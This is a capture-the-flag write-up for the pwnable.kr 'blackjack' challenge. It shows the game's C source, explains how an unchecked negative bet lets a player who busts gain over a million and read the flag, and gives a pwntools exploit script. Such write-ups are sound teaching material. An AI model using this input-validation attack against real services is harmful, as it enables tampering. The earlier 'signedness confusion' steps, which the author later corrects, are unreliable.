# blackjack writeup

## Challenge infos

```text
Hey! check out this C implementation of blackjack game!
I found it online
* http://cboard.cprogramming.com/c-programming/114023-simple-blackjack-program.html

I like to give my flags to millionares.
how much money you got?


ssh blackjack@pwnable.kr -p2222 (pw:guest)
```

## Server content

```text
--- ls -la ---
total 64
drwxr-x---   2 root blackjack  4096 Apr  1 14:40 .
drwxr-xr-x 118 root root       4096 Jun  1 12:05 ..
-r-xr-x---   1 root root      22153 Apr  1 14:40 blackjack
-rw-r--r--   1 root root      26095 Apr  1 14:40 blackjack.c
-rw-r--r--   1 root root        106 Apr  1 14:40 readme
--- id ---
uid=1022(blackjack) gid=1022(blackjack) groups=1022(blackjack)
--- cat file---
// Programmer: Vladislav Shulman
// Final Project
// Blackjack
 
// Feel free to use any and all parts of this program and claim it as your own work
 
//FINAL DRAFT
 
#include <stdlib.h>
#include <stdio.h>
#include <math.h>
#include <string.h>
#include <time.h>                //Used for srand((unsigned) time(NULL)) command
 
#define spade 'S'                 //Used to print spade symbol
#define club 'C'                  //Used to print club symbol
#define diamond 'D'               //Used to print diamond symbol
#define heart 'H'                 //Used to print heart symbol
#define RESULTS "Blackjack.txt"  //File name is Blackjack
 
//Global Variables
int k;
int l;
int d;
int won;
int loss;
int cash = 500;
int bet;
int random_card;
int player_total=0;
int dealer_total;
 
//Function Prototypes
int clubcard();      //Displays Club Card Image
int diamondcard();   //Displays Diamond Card Image
int heartcard();     //Displays Heart Card Image
int spadecard();     //Displays Spade Card Image
int randcard();      //Generates random card
int betting();       //Asks user amount to bet
void asktitle();     //Asks user to continue
void rules();        //Prints "Rules of Vlad's Blackjack" menu
void play();         //Plays game
void dealer();       //Function to play for dealer AI
void stay();         //Function for when user selects 'Stay'
void cash_test();    //Test for if user has cash remaining in purse
void askover();      //Asks if user wants to continue playing
void fileresults();  //Prints results into Blackjack.txt file in program directory
 
//Main Function
int main(void)
{
    setvbuf(stdout, 0, _IONBF, 0);
    setvbuf(stdin, 0, _IOLBF, 0);

    int choice1;
    printf("\n");
    printf("\n");
    printf("\n");
    printf("\n              222                111                            ");
    printf("\n            222 222            11111                              ");
    printf("\n           222   222          11 111                            "); 
    printf("\n                222              111                               "); 
    printf("\n               222               111                           ");   
    printf("\n");
    printf("\n%c%c%c%c%c     %c%c            %c%c         %c%c%c%c%c    %c    %c                ", club, club, club, club, club, spade, spade, diamond, diamond, heart, heart, heart, heart, heart, club, club);  
    printf("\n%c    %c    %c%c           %c  %c       %c     %c   %c   %c              ", club, club, spade, spade, diamond, diamond, heart, heart, club, club);            
    printf("\n%c    %c    %c%c          %c    %c     %c          %c  %c               ", club, club, spade, spade, diamond, diamond, heart, club, club);                        
    printf("\n%c%c%c%c%c     %c%c          %c %c%c %c     %c          %c %c              ", club, club, club, club, club, spade, spade, diamond, diamond, diamond, diamond, heart, club, club);      
    printf("\n%c    %c    %c%c         %c %c%c%c%c %c    %c          %c%c %c             ", club, club, spade, spade, diamond, diamond, diamond, diamond, diamond, diamond, heart, club, club, club);                       
    printf("\n%c     %c   %c%c         %c      %c    %c          %c   %c               ", club, club, spade, spade, diamond, diamond, heart, club, club);                                         
    printf("\n%c     %c   %c%c        %c        %c    %c     %c   %c    %c             ", club, club, spade, spade, diamond, diamond, heart, heart, club, club);                                                            
    printf("\n%c%c%c%c%c%c    %c%c%c%c%c%c%c   %c        %c     %c%c%c%c%c    %c     %c            ", club, club, club, club, club, club, spade, spade, spade, spade, spade, spade, spade, diamond, diamond, heart, heart, heart, heart, heart, club, club);                                                                                     
    printf("\n");     
    printf("\n                        21                                   ");
     
    printf("\n     %c%c%c%c%c%c%c%c      %c%c         %c%c%c%c%c    %c    %c                ", diamond, diamond, diamond, diamond, diamond, diamond, diamond, diamond, heart, heart, club, club, club, club, club, spade, spade);                     
    printf("\n        %c%c        %c  %c       %c     %c   %c   %c              ", diamond, diamond, heart, heart, club, club, spade, spade);                                      
    printf("\n        %c%c       %c    %c     %c          %c  %c               ", diamond, diamond, heart, heart, club, spade, spade);                                           
    printf("\n        %c%c       %c %c%c %c     %c          %c %c              ", diamond, diamond, heart, heart, heart, heart, club, spade, spade);                                     
    printf("\n        %c%c      %c %c%c%c%c %c    %c          %c%c %c             ", diamond, diamond, heart, heart, heart, heart, heart, heart, club, spade, spade, spade);                                                
    printf("\n        %c%c      %c      %c    %c          %c   %c               ", diamond, diamond, heart, heart, club, spade, spade);                                                                               
    printf("\n     %c  %c%c     %c        %c    %c     %c   %c    %c             ", diamond, diamond, diamond, heart, heart, club, spade, spade);                                                                                                               
    printf("\n      %c%c%c      %c        %c     %c%c%c%c%c    %c     %c            ", diamond, diamond, diamond, heart, heart, club, club, club, club, club, spade, spade);                                                                                                                                        
    printf("\n");  
    printf("\n         222                     111                         ");
    printf("\n        222                      111                         ");
    printf("\n       222                       111                         ");
    printf("\n      222222222222222      111111111111111                       ");
    printf("\n      2222222222222222    11111111111111111                         ");
    printf("\n");
    printf("\n");
     
    asktitle();
     
    printf("\n");
    printf("\n");
    return(0);
} //end program
 
void asktitle() // Function for asking player if they want to continue
{
    char choice1;
    int choice2;
     
     printf("\n                 Are You Ready?");
     printf("\n                ----------------");
     printf("\n                      (Y/N)\n                        ");
     scanf("\n%c",&choice1);
 
    while((choice1!='Y') && (choice1!='y') && (choice1!='N') && (choice1!='n')) // If invalid choice entered
    {                                                                           
        printf("\n");
        printf("Incorrect Choice. Please Enter Y for Yes or N for No.\n");
        scanf("%c",&choice1);
    }
 
 
    if((choice1 == 'Y') || (choice1 == 'y')) // If yes, continue. Prints menu.
    { 
            printf("\033[2J\033[1;1H");
            printf("\nEnter 1 to Begin the Greatest Game Ever Played.");
            printf("\nEnter 2 to See a Complete Listing of Rules.");
            printf("\nEnter 3 to Exit Game. (Not Recommended)");
            printf("\nChoice: ");
            scanf("%d", &choice2); // Prompts user for choice
            if((choice2<1) || (choice2>3)) // If invalid choice entered
            {
                printf("\nIncorrect Choice. Please enter 1, 2 or 3\n");
                scanf("%d", &choice2);
            }
            switch(choice2) // Switch case for different choices
            {   
                case 1: // Case to begin game
                   printf("\033[2J\033[1;1H");                    
                   play();                                       
                   break;
                    
                case 2: // Case to see rules
                   printf("\033[2J\033[1;1H");
                   rules();
                   break;
                    
                case 3: // Case to exit game
                   printf("\nYour day could have been perfect.");
                   printf("\nHave an almost perfect day!\n\n");                   
                   exit(0);
                   break;
                    
                default:
                   printf("\nInvalid Input");
            } // End switch case
    } // End if loop
    
             
 
    else if((choice1 == 'N') || (choice1 == 'n')) // If no, exit program
    {
        printf("\nYour day could have been perfect.");
        printf("\nHave an almost perfect day!\n\n");
        printf("\033[2J\033[1;1H");
        exit(0);
    }
     
    return;
} // End function
 
void rules() //Prints "Rules of Vlad's Blackjack" list
{
     char choice1;
     int choice2;
      
     printf("\n           RULES of VLAD's BLACKJACK");
     printf("\n          ---------------------------");
     printf("\nI.");
     printf("\n     Thou shalt not question the odds of this game.");
     printf("\n      %c This program generates cards at random.", spade);
     printf("\n      %c If you keep losing, you are very unlucky!\n", diamond);
      
     printf("\nII.");
     printf("\n     Each card has a value.");
     printf("\n      %c Number cards 1 to 10 hold a value of their number.", spade);
     printf("\n      %c J, Q, and K cards hold a value of 10.", diamond);
     printf("\n      %c Ace cards hold a value of 11", club);
     printf("\n     The goal of this game is to reach a card value total of 21.\n");
      
     printf("\nIII.");
     printf("\n     After the dealing of the first two cards, YOU must decide whether to HIT or STAY.");
     printf("\n      %c Staying will keep you safe, hitting will add a card.", spade);
     printf("\n     Because you are competing against the dealer, you must beat his hand.");
     printf("\n     BUT BEWARE!.");
     printf("\n      %c If your total goes over 21, you will LOSE!.", diamond);
     printf("\n     But the world is not over, because you can always play again.\n");
     printf("\n%c%c%c YOUR RESULTS ARE RECORDED AND FOUND IN SAME FOLDER AS PROGRAM %c%c%c\n", spade, heart, club, club, heart, spade);
     printf("\nWould you like to go the previous screen? (I will not take NO for an answer)");
     printf("\n                  (Y/N)\n                    ");

     scanf("\n%c",&choice1);
      
    while((choice1!='Y') && (choice1!='y') && (choice1!='N') && (choice1!='n')) // If invalid choice entered
    {                                                                           
        printf("\n");
        printf("Incorrect Choice. Please Enter Y for Yes or N for No.\n");
        scanf("%c",&choice1);
    }
 
 
    if((choice1 == 'Y') || (choice1 == 'y')) // If yes, continue. Prints menu.
    { 
            printf("\033[2J\033[1;1H");
            asktitle();
    } // End if loop
    
             
 
    else if((choice1 == 'N') || (choice1 == 'n')) // If no, convinces user to enter yes
    {
        printf("\033[2J\033[1;1H");
        printf("\n                 I told you so.\n");
        asktitle();
    }
     
    return;
} // End function
 
int clubcard() //Displays Club Card Image
{  
   
    srand((unsigned) time(NULL)); //Generates random seed for rand() function
    k=rand()%13+1;
     
    if(k<=9) //If random number is 9 or less, print card with that number
    {
    //Club Card
    printf("-------\n");
    printf("|%c    |\n", club);
    printf("|  %d  |\n", k);
    printf("|    %c|\n", club);
    printf("-------\n");
    }
     
     
    if(k==10) //If random number is 10, print card with J (Jack) on face
    {
    //Club Card
    printf("-------\n");
    printf("|%c    |\n", club);
    printf("|  J  |\n");
    printf("|    %c|\n", club);
    printf("-------\n");
    }
     
     
    if(k==11) //If random number is 11, print card with A (Ace) on face
    {
    //Club Card
    printf("-------\n");
    printf("|%c    |\n", club);
    printf("|  A  |\n");
    printf("|    %c|\n", club);
    printf("-------\n");
    if(player_total<=10) //If random number is Ace, change value to 11 or 1 depending on dealer total
         {
             k=11;
         }
          
         else
         {
 
             k=1;
         }
    }
     
     
    if(k==12) //If random number is 12, print card with Q (Queen) on face
    {
    //Club Card
    printf("-------\n");
    printf("|%c    |\n", club);
    printf("|  Q  |\n");
    printf("|    %c|\n", club);
    printf("-------\n");
    k=10; //Set card value to 10
    }
     
     
    if(k==13) //If random number is 13, print card with K (King) on face
    {
    //Club Card
    printf("-------\n");
    printf("|%c    |\n", club);
    printf("|  K  |\n");
    printf("|    %c|\n", club);
    printf("-------\n");
    k=10; //Set card value to 10
    }
    return k;           
}// End function
 
int diamondcard() //Displays Diamond Card Image
{
     
    srand((unsigned) time(NULL)); //Generates random seed for rand() function
    k=rand()%13+1;
     
    if(k<=9) //If random number is 9 or less, print card with that number
    {
    //Diamond Card
    printf("-------\n");
    printf("|%c    |\n", diamond);
    printf("|  %d  |\n", k);
    printf("|    %c|\n", diamond);
    printf("-------\n");
    }
     
    if(k==10) //If random number is 10, print card with J (Jack) on face
    {
    //Diamond Card
    printf("-------\n");
    printf("|%c    |\n", diamond);
    printf("|  J  |\n");
    printf("|    %c|\n", diamond);
    printf("-------\n");
    }
     
    if(k==11) //If random number is 11, print card with A (Ace) on face
    {
    //Diamond Card
    printf("-------\n");
    printf("|%c    |\n", diamond);
    printf("|  A  |\n");
    printf("|    %c|\n", diamond);
    printf("-------\n");
    if(player_total<=10) //If random number is Ace, change value to 11 or 1 depending on dealer total
         {
             k=11;
         }
          
         else
         {
             k=1;
         }
    }
     
    if(k==12) //If random number is 12, print card with Q (Queen) on face
    {
    //Diamond Card
    printf("-------\n");
    printf("|%c    |\n", diamond);
    printf("|  Q  |\n");
    printf("|    %c|\n", diamond);
    printf("-------\n");
    k=10; //Set card value to 10
    }
     
    if(k==13) //If random number is 13, print card with K (King) on face
    {
    //Diamond Card
    printf("-------\n");
    printf("|%c    |\n", diamond);
    printf("|  K  |\n");
    printf("|    %c|\n", diamond);
    printf("-------\n");
    k=10; //Set card value to 10
    }
    return k;
}// End function
 
int heartcard() //Displays Heart Card Image
{
     
    srand((unsigned) time(NULL)); //Generates random seed for rand() function
    k=rand()%13+1;
     
    if(k<=9) //If random number is 9 or less, print card with that number
    {
    //Heart Card
    printf("-------\n");
    printf("|%c    |\n", heart); 
    printf("|  %d  |\n", k);
    printf("|    %c|\n", heart);
    printf("-------\n");
    }
     
    if(k==10) //If random number is 10, print card with J (Jack) on face
    {
    //Heart Card
    printf("-------\n");
    printf("|%c    |\n", heart);
    printf("|  J  |\n");
    printf("|    %c|\n", heart);
    printf("-------\n");
    }
     
    if(k==11) //If random number is 11, print card with A (Ace) on face
    {
    //Heart Card
    printf("-------\n");
    printf("|%c    |\n", heart);
    printf("|  A  |\n");
    printf("|    %c|\n", heart);
    printf("-------\n");
    if(player_total<=10) //If random number is Ace, change value to 11 or 1 depending on dealer total
         {
             k=11;
         }
          
         else
         {
             k=1;
         }
    }
     
    if(k==12) //If random number is 12, print card with Q (Queen) on face
    {
    //Heart Card
    printf("-------\n");
    printf("|%c    |\n", heart);
    printf("|  Q  |\n");
    printf("|    %c|\n", heart);
    printf("-------\n");
    k=10; //Set card value to 10
    }
     
    if(k==13) //If random number is 13, print card with K (King) on face
    {
    //Heart Card
    printf("-------\n");
    printf("|%c    |\n", heart);
    printf("|  K  |\n");
    printf("|    %c|\n", heart);
    printf("-------\n");
    k=10; //Set card value to 10
    }
    return k;
} // End Function
 
int spadecard() //Displays Spade Card Image
{
     
    srand((unsigned) time(NULL)); //Generates random seed for rand() function
    k=rand()%13+1;
     
    if(k<=9) //If random number is 9 or less, print card with that number
    {
    //Spade Card
    printf("-------\n");
    printf("|%c    |\n", spade);
    printf("|  %d  |\n", k);
    printf("|    %c|\n", spade);
    printf("-------\n");
    }
     
    if(k==10) //If random number is 10, print card with J (Jack) on face
    {
    //Spade Card
    printf("-------\n");
    printf("|%c    |\n", spade);
    printf("|  J  |\n");
    printf("|    %c|\n", spade);
    printf("-------\n");
    }
     
    if(k==11) //If random number is 11, print card with A (Ace) on face
    {
    //Spade Card
    printf("-------\n");
    printf("|%c    |\n", spade);
    printf("|  A  |\n");
    printf("|    %c|\n", spade);
    printf("-------\n");
    if(player_total<=10) //If random number is Ace, change value to 11 or 1 depending on dealer total
         {
             k=11;
         }
          
         else
         {
             k=1;
         }
    }
     
    if(k==12) //If random number is 12, print card with Q (Queen) on face
    {
    //Spade Card
    printf("-------\n");
    printf("|%c    |\n", spade);
    printf("|  Q  |\n");
    printf("|    %c|\n", spade);
    printf("-------\n");
    k=10; //Set card value to 10
    }
     
    if(k==13) //If random number is 13, print card with K (King) on face
    {
    //Spade Card
    printf("-------\n");
    printf("|%c    |\n", spade);
    printf("|  K  |\n");
    printf("|    %c|\n", spade);
    printf("-------\n");
    k=10; //Set card value to 10
    }
    return k;
} // End Function
 
int randcard() //Generates random card
{
                
     srand((unsigned) time(NULL)); //Generates random seed for rand() function
     random_card = rand()%4+1;
      
     if(random_card==1)
     {   
         clubcard();
         l=k;
     }
      
     if(random_card==2)
     {
         diamondcard();
         l=k;
     }
      
     if(random_card==3)
     {
         heartcard();
         l=k;
     }
          
     if(random_card==4)
     {
         spadecard();
         l=k;
     }    
     return l;
} // End Function   

 
void play() //Plays game
{
      
     int p=0; // holds value of player_total
     int i=1; // counter for asking user to hold or stay (aka game turns)
     char choice3;
      
     cash = cash;
     cash_test();
     printf("\nCash: $%d\n",cash); //Prints amount of cash user has
     randcard(); //Generates random card
     player_total = p + l; //Computes player total
     p = player_total;
     printf("\nYour Total is %d\n", p); //Prints player total
     dealer(); //Computes and prints dealer total
     betting(); //Prompts user to enter bet amount
        
     while(i<=21) //While loop used to keep asking user to hit or stay at most twenty-one times
                  //  because there is a chance user can generate twenty-one consecutive 1's
     {
         if(p==21) //If user total is 21, win
         {
             printf("\nUnbelievable! You Win!\n");
             won = won+1;
             cash = cash+bet;
             printf("\nYou have %d Wins and %d Losses. Awesome!\n", won, loss);
             dealer_total=0;
             askover();
         }
      
         if(p>21) //If player total is over 21, loss
         {
             printf("\nWoah Buddy, You Went WAY over.\n");
             loss = loss+1;
             cash = cash - bet;
             printf("\nYou have %d Wins and %d Losses. Awesome!\n", won, loss);
             dealer_total=0;
             askover();
         }
      
         if(p<=21) //If player total is less than 21, ask to hit or stay
         {         
             printf("\n\nWould You Like to Hit or Stay?");
              
             scanf("%c", &choice3);
             while((choice3!='H') && (choice3!='h') && (choice3!='S') && (choice3!='s')) // If invalid choice entered
             {                                                                           
                 printf("\n");
                 printf("Please Enter H to Hit or S to Stay.\n");
                 scanf("%c",&choice3);
             }
 
             if((choice3=='H') || (choice3=='h')) // If Hit, continues
             { 
                 randcard();
                 player_total = p + l;
                 p = player_total;
                 printf("\nYour Total is %d\n", p);
                 dealer();
                  if(dealer_total==21) //Is dealer total is 21, loss
                  {
                      printf("\nDealer Has the Better Hand. You Lose.\n");
                      loss = loss+1;
                      cash = cash - bet;
                      printf("\nYou have %d Wins and %d Losses. Awesome!\n", won, loss);
                      dealer_total=0;
                      askover();
                  } 
      
                  if(dealer_total>21) //If dealer total is over 21, win
                  {                      
                      printf("\nDealer Has Went Over!. You Win!\n");
                      won = won+1;
                      cash = cash+bet;
                      printf("\nYou have %d Wins and %d Losses. Awesome!\n", won, loss);
                      dealer_total=0;
                      askover();
                  }
             }
             if((choice3=='S') || (choice3=='s')) // If Stay, does not continue
             {
                printf("\nYou Have Chosen to Stay at %d. Wise Decision!\n", player_total);
                stay();
             }
          }
             i++; //While player total and dealer total are less than 21, re-do while loop 
     } // End While Loop
} // End Function
 
void dealer() //Function to play for dealer AI
{
     int z;
      
     if(dealer_total<17)
     {
      srand((unsigned) time(NULL) + 1); //Generates random seed for rand() function
      z=rand()%13+1;
      if(z<=10) //If random number generated is 10 or less, keep that value
      {
         d=z;
          
      }
      
      if(z>11) //If random number generated is more than 11, change value to 10
      {
         d=10;
      }
      
      if(z==11) //If random number is 11(Ace), change value to 11 or 1 depending on dealer total
      {
         if(dealer_total<=10)
         {
             d=11;
         }
          
         else
         {
             d=1;
         }
      }
     dealer_total = dealer_total + d;
     }
           
     printf("\nThe Dealer Has a Total of %d", dealer_total); //Prints dealer total
      
} // End Function 
 
void stay() //Function for when user selects 'Stay'
{
     dealer(); //If stay selected, dealer continues going
     if(dealer_total>=17)
     {
      if(player_total>=dealer_total) //If player's total is more than dealer's total, win
      {
         printf("\nUnbelievable! You Win!\n");
         won = won+1;
         cash = cash+bet;
         printf("\nYou have %d Wins and %d Losses. Awesome!\n", won, loss);
         dealer_total=0;
         askover();
      }
      if(player_total<dealer_total) //If player's total is less than dealer's total, loss
      {
         printf("\nDealer Has the Better Hand. You Lose.\n");
         loss = loss+1;
         cash = cash - bet;
         printf("\nYou have %d Wins and %d Losses. Awesome!\n", won, loss);
         dealer_total=0;
         askover();
      }
      if(dealer_total>21) //If dealer's total is more than 21, win
      {
         printf("\nUnbelievable! You Win!\n");
         won = won+1;
         cash = cash+bet;
         printf("\nYou have %d Wins and %d Losses. Awesome!\n", won, loss);
         dealer_total=0;
         askover();
      }
     }
     else
     {
         stay();
     }
      
} // End Function
 
void cash_test() //Test for if user has cash remaining in purse
{
     if (cash <= 0) //Once user has zero remaining cash, game ends and prompts user to play again
     {
        printf("You Are Bankrupt. Game Over");
        cash = 500;
        askover();
     }
     if (cash > 1000000){
        FILE* fp=fopen("flag", "r");
        char buf[100];
        memset(buf, 0, 100);
        fread(buf, 1, 100, fp);
        printf("%s\n", buf);
        fclose(fp);
     }
} // End Function
 
int betting() //Asks user amount to bet
{
 printf("\n\nEnter Bet: $");
 scanf("%d", &bet);
 
 if (bet > cash) //If player tries to bet more money than player has
 {
        printf("\nYou cannot bet more money than you have.");
        printf("\nEnter Bet: ");
        scanf("%d", &bet);
        return bet;
 }
 else return bet;
} // End Function
 
void askover() // Function for asking player if they want to play again
{
    char choice1;
         
     printf("\nWould You Like To Play Again?");
     printf("\nPlease Enter Y for Yes or N for No\n");
     scanf("\n%c",&choice1);
 
    while((choice1!='Y') && (choice1!='y') && (choice1!='N') && (choice1!='n')) // If invalid choice entered
    {                                                                           
        printf("\n");
        printf("Incorrect Choice. Please Enter Y for Yes or N for No.\n");
        scanf("%c",&choice1);
    }
 
 
    if((choice1 == 'Y') || (choice1 == 'y')) // If yes, continue.
    { 
            printf("\033[2J\033[1;1H");
            play();
    }
  
    else if((choice1 == 'N') || (choice1 == 'n')) // If no, exit program
    {
        fileresults();
        printf("\nBYE!!!!\n\n");
        printf("\033[2J\033[1;1H");
        exit(0);
    }
    return;
} // End function
 
void fileresults() //Prints results into Blackjack.txt file in program directory
{
     return;
} // End Function

--- cat file---
once you connect to port 9009, the "blackjack" binary will be executed under asm_pwn privilege. get flag.
```
## Exploitation objective
* The ssh user is ```blackjack```, group ```blackjack```
* The ```flag``` file is readable only by the user ```asm_pwn``` or the group ```root```
* The ```blackjack``` binary is a 32bit ELF executable by the ```asm_pwn``` user or members of the ```blackjack``` group and is ```suid``` meaning that it executes with the rights of its user even if called by a member of its group

This means that if we pwn the ```blackjack``` executable we can gain read access to the ```flag``` file via suid user ```asm_pwn```.

The ```blackjack``` executable is certainly compiled from the ```blackjack.c``` source code, let's have a look.

## C code analysis

Looking at the main vulnerability points in the code:

```c
int cash = 500;
int bet;
```
* The ```cash``` variable starts with 500 dollars
* The ```bet``` variable is declared as a signed integer

```c
void cash_test() //Test for if user has cash remaining in purse
{
     if (cash <= 0) //Once user has zero remaining cash, game ends and prompts user to play again
     {
        printf("You Are Bankrupt. Game Over");
        cash = 500;
        askover();
     }
     if (cash > 1000000){
        FILE* fp=fopen("flag", "r");
        char buf[100];
        memset(buf, 0, 100);
        fread(buf, 1, 100, fp);
        printf("%s\n", buf);
        fclose(fp);
     }
}
```
* The ```cash_test()``` function checks if we have more than 1,000,000 dollars in cash
* If we do, it opens and prints the contents of the ```flag``` file
* This is our target - we need to get our cash above 1,000,000

```c
int betting() //Asks user amount to bet
{
 printf("\n\nEnter Bet: $");
 scanf("%d", &bet);
 
 if (bet > cash) //If player tries to bet more money than player has
 {
        printf("\nYou cannot bet more money than you have.");
        printf("\nEnter Bet: ");
        scanf("%d", &bet);
        return bet;
 }
 else return bet;
}
```
* The ```betting()``` function reads our bet using ```scanf("%d", &bet)```
* It only checks if ```bet > cash```, but doesn't validate negative values
* This is the key vulnerability - we can bet negative amounts!

```c
if(player_total>=dealer_total) //If player's total is more than dealer's total, win
{
   printf("\nUnbelievable! You Win!\n");
   won = won+1;
   cash = cash+bet;  // This adds our bet to cash!
   // ...
}
```
* When we win, the game adds our ```bet``` to our ```cash```
* If we bet a negative amount and win, we actually gain money instead of losing it!

## Signedness confusion

The vulnerability is a classic signedness confusion bug:

1. The ```bet``` variable is declared as a signed integer, so it can hold negative values
2. The betting function only checks if ```bet > cash```, which prevents us from betting more than we have
3. However, it doesn't check for negative values
4. When we bet a negative amount (like -1000000) and win, the game executes ```cash = cash + bet```
5. Since ```bet``` is negative, this actually subtracts money from our cash total
6. But the game logic treats this as "winning money" because we provided a negative bet

Wait, let me re-examine the logic. If we bet -1000000 and win, then ```cash = cash + bet``` would be ```cash = 500 + (-1000000) = -999500```, which would make us bankrupt.

Let me look at the exploit again - it seems like the strategy might be different. Let me think about this more carefully...

Actually, the key insight is that if we bet a negative amount and LOSE, then:
```c
cash = cash - bet;  // This subtracts a negative number, which is addition!
```

So if we bet -1000000 and lose, we get ```cash = 500 - (-1000000) = 500 + 1000000 = 1000500``` which is above the threshold!

## Exploitation

The exploitation strategy is:
1. Start the game with 500 dollars
2. Bet a large negative amount (like -1000000)
3. Intentionally lose the game by going over 21 (bust)
4. When we lose, the game executes ```cash = cash - bet```
5. Since bet is negative, this becomes ```cash = cash - (-1000000) = cash + 1000000```
6. Our cash becomes 1000500, which triggers the flag printing in ```cash_test()```

The steps are:
1. Connect to the game
2. Choose to play (Y, then 1)
3. Bet -1000000 (a large negative number)
4. Keep hitting until we bust (go over 21)
5. The game will subtract our negative bet, giving us over 1 million dollars
6. The ```cash_test()``` function will print the flag

## Exploitation script

```python
#!/usr/bin/env python
from pwn import *
```
* Use [pwntools](https://github.com/Gallopsled/pwntools) for automatic exploitation

```python
server = ssh('blackjack', 'pwnable.kr', 2222, 'guest')
io = server.process(['nc', '0', '9009'])
```
* Connect to the server using SSH and start the blackjack game via netcat on port 9009

```python
io.sendline('Y')
io.sendline('1')  # Choose to play
io.sendline('-1000000')  # Send a large negative bet to trigger the exploit
```
* Answer 'Y' to the "Are You Ready?" prompt
* Choose option '1' to begin playing the game
* When prompted for a bet, enter -1000000 (negative one million)
* This exploits the signedness bug - the game doesn't validate negative bets

```python
# hit until bust
while True:
    print(io.recvuntil("Please Enter H to Hit or S to Stay.", timeout=1).decode())
    io.sendline('H')
    response = io.recv(timeout=1).decode()
    if 'Woah Buddy, You Went WAY over.' in response:
        break
```
* Keep hitting (taking cards) until we bust (go over 21)
* Print the game output to see the progress
* When we bust, we lose the hand and the game executes ```cash = cash - bet```
* Since bet is -1000000, this becomes ```cash = 500 - (-1000000) = 1000500```

```python
io.sendline('Y')  # pay again
io.interactive()  # interact with the shell
```
* Answer 'Y' to play again - this triggers the ```cash_test()``` function
* Since our cash is now over 1,000,000, the flag will be printed
* Use interactive mode to see the flag output
